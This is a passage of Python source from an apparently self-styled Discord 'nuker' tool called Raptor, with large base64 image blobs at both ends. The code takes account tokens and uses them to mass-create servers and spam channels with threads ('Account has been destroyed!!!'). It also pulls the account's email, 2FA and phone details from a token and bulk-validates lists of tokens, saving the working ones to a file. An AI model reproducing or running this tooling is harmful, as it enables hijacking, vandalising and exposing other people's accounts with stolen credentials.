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"
            for x in range(15):
                try:
                    r = requests.post(url2,headers=header, json={'name':"Nuked By Raptor", 'icon':image})
                    if r.status_code == 200 or 204 or 201:
                        print("Done!")
                        ids.append(r.json()['id'])
                    else:
                        print("Failed")
                except Exception as e:
                    print('Max Server Limit Acceded')

        def channelmake():
            length = len(ids)
            for b in range(length):
                for i in range(15):
                    url1 = f'https://discord.com/api/v9/guilds/{ids[b]}/channels'
                    r = requests.post(url1, headers=header, json={'name':'nuked-by-raptor'})

        threads = []

        for _ in range(20):
            t = threading.Thread(target=servercreate)
            t.daemon = True
            t.start()
            threads.append(t)

        for thread in threads:
            t.join()

        threaad = []

        for r in range(40):
            a = threading.Thread(target=channelmake)
            a.daemon = True
            a.start()
            threaad.append(a)

        for thread in threaad:
            a.join()

        print("Finished Account has been destroyed!!!")
    elif options4 in ['7','07']:
      tool()
      return
    else:
      print('Invalid Option')

    while __name__ == '__main__' and options4 not in ['7','07']:
      print(Fore.BLUE)
      os.system('pause')
      tokennuke()

  global tokeninfo
  def tokeninfo():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Token Information")
    print(f'''
{Fore.MAGENTA}  _____     _                ___        __       
 |_   _|__ | | _____ _ __   |_ _|_ __  / _| ___  
   | |/ _ \| |/ / _ \ '_ \   | || '_ \| |_ / _ |
{Fore.RED}   | | (_) |   <  __/ | | |  | || | | |  _| (_) |
   |_|\___/|_|\_\___|_| |_| |___|_| |_|_|  \___/ 
    {Fore.BLUE}                                             
    ''')
    url = 'https://discord.com/api/v9/users/@me'

    tukan = input('What is the token you want to check?: ')

    header = {
        "authority": "discord.com",
        "method": "POST",
        "path": "/api/v9/users/@me",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "Authorization": f"{tukan}",
        "content-length": "0",
        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
        "origin": "https://discord.com",
        'referer': 'https://discord.com/channels/@me',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": useragent(),
        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }

    r = requests.get(url, headers=header)

    url2 = 'https://discord.com/api/v9/users/@me/relationships'
    numoffriend = 0
    t = requests.get(url2, headers=header).json()
    for id in t:
      numoffriend += 1

    numofguilds = 0
    e = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=header).json()
    for id in e:
      numofguilds += 1

    cls()
    print(Fore.RESET)
    print(f'User Id: {Fore.GREEN}{r.json()["id"]}')
    print(f'{Fore.RESET}Full Name: {Fore.GREEN}{r.json()["username"]}#{r.json()["discriminator"]}')
    print(f'{Fore.RESET}Number Of Friends + Friend Requests: {Fore.GREEN}{numoffriend}')
    print(f'{Fore.RESET}Number Of Servers: {Fore.GREEN}{numofguilds}')
    pf = r.json()["avatar"]
    id = r.json()["id"]
    pfp = f'https://cdn.discordapp.com/avatars/{id}/{pf}'

    print(f'{Fore.RESET}Profile Picture: {Fore.GREEN}{pfp}')
    if r.json()['banner'] == 'null':
        print(f'{Fore.RESET}Banner:{Fore.RED} None')
    else:
        banner = f'https://cdn.discordapp.com/banners/{r.json()["id"]}/{r.json()["banner"]}'
        print(f'{Fore.RESET}Banner: {Fore.GREEN}{banner}')
    print(f'{Fore.RESET}Bio: {Fore.GREEN}{r.json()["bio"]}')
    print(f'{Fore.RESET}Language: {Fore.GREEN}{r.json()["locale"]}')
    print(f'{Fore.RESET}Email: {Fore.GREEN}{r.json()["email"]}')
    print(f'{Fore.RESET}2fa: {Fore.GREEN}{r.json()["mfa_enabled"]}')
    print(f'{Fore.RESET}Email Verifed: {Fore.GREEN}{r.json()["verified"]}')
    if r.json()['phone'] == 'null' or 'Null' or 'None' or '':
        print(f'{Fore.RESET}Phone Verification:{Fore.RED} False')
    else:
        print(f'{Fore.RESET}Phone Verification:{Fore.GREEN} True')
    print(f'{Fore.RESET}Public Flags: {Fore.GREEN}{r.json()["public_flags"]}')

    settings = 'https://discord.com/api/v9/users/@me/settings'
    t = requests.get(settings, headers=header)
    print(f'{Fore.RESET}Custom Status: {Fore.GREEN}{t.json()["custom_status"]}')
    print(f'{Fore.RESET}Status: {Fore.GREEN}{t.json()["status"]}')

  global checker
  def checker():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Discord Token Checker")
      print(f'''
{Fore.MAGENTA}   ____ _               _             
  / ___| |__   ___  ___| | _____ _ __ 
 | |   | '_ \ / _ \/ __| |/ / _ \ '__|
{Fore.RED} | |___| | | |  __/ (__|   <  __/ |   
  \____|_| |_|\___|\___|_|\_\___|_|   
                                      
      ''')
      file = input(' do you want to put all the valid tokens in a file?: ')
      valid = 0
      invalid = 0

      tokens = []
      token = []

      with open('tokens.txt','r') as f:
        for line in f:
          tokens.append(line)

      for element in tokens:
        token.append(element.strip())

      length = len(token)

      if file in yeslist:
        tokenfile = open('validtokens.txt','a')
        for x in range(length):
            header = {
                "authority": "discord.com",
                "scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": f'{token[x]}',
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": useragent(),
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.GREEN} [+] Valid {token[x]}' )
                valid += 1
                tokenfile.write(token[x] + '\n')
            else:
                print(f'\033[31m [-] Invalid {token[x]}', )
                invalid += 1

        print(f'{Fore.BLUE} There are {valid} valid tokens and {invalid} invalid tokens')

      elif file in nolist:
        for x in range(length):
            header = {
                "authority": "discord.com",
                "scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": f'{token[x]}',
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": useragent(),
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.GREEN} [+] Valid {token[x]}' )
                valid += 1
            else:
                print(f'\033[31m [-] Invalid {token[x]}', )
                invalid += 1

        print(f'There are {valid} valid tokens and {invalid} invalid tokens')

  global pfpmanager
  def pfpmanager():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Pfp Manager")
    optionsforpfp = print(f'''
    {Fore.MAGENTA} ____   __         __  __                                   
    |  _ \ / _|_ __   |  \/  | __ _ _ __   __ _  __ _  ___ _ __ 
    | |_) | |_| '_ \  | |\/| |/ _` | '_ \ / _` |/ _` |/ _ \ '__|
    {Fore.RED}|  __/|  _| |_) | | |  | | (_| | | | | (_| | (_| |  __/ |   
    |_|   |_| | .__/  |_|  |_|\__,_|_| |_|\__,_|\__, |\___|_|   
              |_|                               |___/     
    {Fore.GREEN}      
    [1] ONE PFP
    [2] RANDOM PFP
    [3] RAPTOR PFP

    ''')

    optionsforpfp = int(input('[\>]'))

    if optionsforpfp == 1:
        image = input('What is the name of the image (Make sure the image is in the same folder as Raptor.py): ')
        with open(image,'rb') as f:
            byteform = base64.b64encode(f.read())
            imageurl1 = byteform.decode('utf-8')

        payload1 = {
            'avatar':f'data:image/png;base64,{imageurl1}'
        }

    elif optionsforpfp == 2:
        path = input('What is the directory where all the images are?: ')
        path.replace(r'\\','\\\\')

        image1 = random.choice([
        x for x in os.listdir(path)
        if os.path.isfile(os.path.join(path, x))
    ])

        with open(image1,'rb') as e:
            byteform = base64.b64encode(e.read())
            imageurl2 = byteform.decode('utf-8')

        payload2 = {
            'avatar':f'data:image/png;base64,{imageurl2}'
        }

    elif optionsforpfp == 3:
        image = "data:image/jpeg;base64,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